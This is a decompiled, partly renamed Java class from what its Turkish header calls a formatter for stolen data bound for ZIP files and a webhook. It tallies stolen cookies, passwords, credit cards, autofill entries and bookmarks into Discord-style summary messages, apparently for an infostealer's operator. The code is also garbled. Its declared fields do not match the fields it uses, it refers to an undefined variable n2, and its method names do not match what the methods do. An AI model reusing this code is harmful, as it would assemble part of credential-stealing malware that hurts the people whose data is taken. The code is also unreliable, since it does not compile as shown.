/*\n * ========================================\n * DEOBFUSCATED: DataFormatter.java\n * Original: a/f.java\n * ----------------------------------------\n * Veri biçimlendirici - çalınan verileri ZIP ve webhook formatına çevirir\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package a;

public class f {
    private int cookieCount = 0;
    private int passwordCount = 0;
    private int creditCardCount = 0;
    private int autofillCount = 0;
    private int bookmarkCount = 0;

    public void setCookies(int n) {
        this.a += n2;
    }

    public void setPasswords(int n) {
        this.b += n2;
    }

    public void setCreditCards(int n) {
        this.c += n2;
    }

    public void setAutofill(int n) {
        this.d += n2;
    }

    public void setBookmarks(int n) {
        this.e += n2;
    }

    public int getCookies() {
        return this.a;
    }

    public int getPasswords() {
        return this.b;
    }

    public int getCreditCards() {
        return this.c;
    }

    public int getAutofill() {
        return this.d;
    }

    public int getBookmarks() {
        return this.e;
    }

    public String getComputerName() {
        return "**Summary**\n\nA: **" + this.d + "**\nC: **" + this.b + "**\nP: **" + this.a + "**\nW: **" + this.e + "**\nK: **" + this.c + "**";
    }

    public String getUserName() {
        return "```A: " + this.d + "\nC: " + this.b + "\nP: " + this.a + "\nW: " + this.e + "\nK: " + this.c + "```";
    }
}

